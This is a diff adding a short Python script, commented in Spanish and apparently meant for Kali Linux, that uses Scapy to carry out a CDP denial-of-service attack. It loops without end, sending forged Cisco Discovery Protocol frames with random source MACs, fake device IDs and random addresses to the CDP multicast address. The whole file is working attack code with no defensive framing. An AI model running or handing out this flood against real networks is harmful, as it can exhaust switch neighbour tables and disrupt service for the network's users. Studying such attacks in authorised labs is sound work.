@@ -1,0 +1,32 @@
+#!/usr/bin/env python3
+from scapy.all import *
+import random
+import time
+
+iface = "eth0"   # Ajusta según tu interfaz en Kali
+
+def random_mac():
+    return ":".join(["%02x" % random.randint(0,255) for _ in range(6)])
+
+print("[*] Iniciando ataque CDP DoS...")
+
+try:
+    while True:
+        src_mac = random_mac()
+        # Trama Ethernet hacia dirección multicast reservada de CDP
+        ether = Ether(src=src_mac, dst="01:00:0c:cc:cc:cc")
+        llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
+        snap = SNAP(OUI=0x00000c, code=0x2000)
+
+        # Payload CDP falso
+        cdp_hdr = CDPHeader(version=2, ttl=180)
+        cdp_dev = CDPMsgDeviceID(val="FakeDevice-" + str(random.randint(1,1000)))
+        cdp_port = CDPMsgPortID(iface="ethX")
+        cdp_cap = CDPMsgCapabilities(val=0x00000001)
+        cdp_addr = CDPMsgAddr(atype=1, addr="192.168." + str(random.randint(1,254)) + ".1")
+
+        pkt = ether/llc/snap/cdp_hdr/cdp_dev/cdp_port/cdp_cap/cdp_addr
+        sendp(pkt, iface=iface, verbose=False)
+        time.sleep(0.05)
+except KeyboardInterrupt:
+    print("\n[*] Ataque detenido.")
